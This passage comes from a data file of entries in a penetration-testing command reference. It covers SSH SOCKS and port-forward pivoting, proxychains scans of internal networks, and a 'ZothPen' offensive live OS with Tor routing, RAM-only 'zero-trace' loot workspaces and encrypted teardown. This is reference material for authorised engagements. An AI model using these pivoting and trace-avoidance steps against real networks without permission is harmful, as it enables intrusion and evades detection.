    { t:'dynamic SOCKS through a host you can log into', cmd:'ssh -D 1080 -N -f lab@192.168.56.20', out:'then `proxychains4 nmap -sT -Pn` into that network' },
    { t:'local port forward to an internal service', cmd:'ssh -L 8443:10.10.10.5:443 lab@192.168.56.20', out:'localhost:8443 is the internal HTTPS service' },
    { t:'key hygiene', cmd:'ssh-keygen -t ed25519 -a 100 -C "engagement-2026"', out:'a modern key; never reuse a personal key on a client host' }
  ] },

{ c:'proxychains', al:['proxychains4'], cat:'post',
  what:'Forces a tool\'s connections through a SOCKS/HTTP proxy chain — the way you point ordinary tools into a pivoted network.',
  syn:'proxychains4 -f px.conf nmap -sT -Pn -p 445 INTERNAL_IP',
  ex:[{ t:'scan through the pivot', cmd:'proxychains4 -q -f /etc/proxychains4.conf nmap -sT -Pn -n --open -p1-1024 10.10.10.5', out:'TCP-only reachability; expect it to be slow — one connection at a time per thread' }],
  warn:'SOCKS is TCP-only: no -sS, no UDP, no masscan. Worse, no ICMP means scans need -Pn. Layer-3 tunnelling is the better answer when available.' },

{ c:'zothpen', al:['zothpen-lite','zoth-tor-switch','toram'], cat:'sysadmin', tool:'t-zothpen',
  what:'Sovereign offensive OS (Amnesic Debian Live ISO with toram RAM-only mode & nftables Tor switch) and ZothPen-Lite browser workstation (zothos.nullai.tech) with Pentesting Dojo, Chain of Thoughts, and Vaelor Vault.',
  syn:'sudo zoth-tor-switch start | status | stop   # or launch https://zothos.nullai.tech',
  ex:[
    { t:'verify amnesic RAM boot & enable nftables Tor routing on ZothPen Live ISO', cmd:'grep -o "toram" /proc/cmdline && sudo zoth-tor-switch start && sudo zoth-tor-switch status', out:'toram — nftables Tor routing active (TCP->9040, DNS->9053, UDP blocked)' },
    { t:'create a zero-trace RAM workspace on ZothPen, Kali, Parrot, or any Linux OS', cmd:'mkdir -p /dev/shm/zothpen-op/{recon,scans,loot,evidence} && chmod 700 /dev/shm/zothpen-op', out:'volatile tmpfs directory created in RAM — zero NVMe/disk writes' },
    { t:'seal engagement loot with AES-256 before teardown (Vaelor / OpenSSL)', cmd:'tar -czf - -C /dev/shm/zothpen-op loot evidence | openssl enc -aes-256-cbc -pbkdf2 -iter 600000 -salt -out ~/vault.enc && rm -rf /dev/shm/zothpen-op', out:'encrypted archive saved; volatile RAM workspace purged' }
  ],
  tips:['Every workflow in this manual runs on ZothPen Live ISO, ZothPen-Lite (zothos.nullai.tech), Kali Linux, Parrot OS, or any POSIX Linux host','Use /dev/shm on standard Linux VMs when you want ZothPen-style RAM-only scratch storage without touching disk','Disable zoth-tor-switch or Parrot anonsurf before running high-rate nmap SYN scans against local lab subnets'],
  warn:'In toram RAM-only mode, poweroff wipes the entire session permanently. Always export your encrypted Vaelor bundle or report before shutting down.' },

{ c:'chain-of-thoughts', al:['cot','vaelor'], cat:'automate', tool:'t-cot',
  what:'ZothPen & ZothPen-Lite DAG hypothesis engine (MCP server + Web Studio): branch attack hypotheses, attach command output as verification evidence, audit reasoning chains, and export Markdown reports.',
  syn:'npx @nullaitech/chain-of-thoughts-mcp   # or open Chain of Thoughts in ZothPen-Lite',
  ex:[
    { t:'record an observation and branch two competing attack hypotheses', cmd:'cot_push_thought --type observation "Port 445 & 8080 open on 192.168.56.20" && cot_branch_hypothesis --branches "H1: SMB guest share,H2: HTTP 8080 API IDOR"', out:'created root observation T1 and forked branches H1, H2 in DAG' },
    { t:'verify a hypothesis with command evidence and export Markdown report', cmd:'cot_verify_step --id H1 --status verified --evidence "READ access on //192.168.56.20/backups" && cot_export_markdown > report-cot.md', out:'verified node H1 and wrote structured DAG report to report-cot.md' }
  ],
  tips:['Log your hypothesis before running the exploit so dead ends are documented for the coverage section of your report','Combine Chain of Thoughts with Vaelor Zero-Knowledge Vault in ZothPen-Lite to keep sensitive hashes encrypted with Argon2id + AES-256-GCM'],
  warn:'Never paste unredacted production secrets into plain Markdown exports; store raw credential material inside Vaelor Vault and reference the hash ID in your CoT node.' }

];
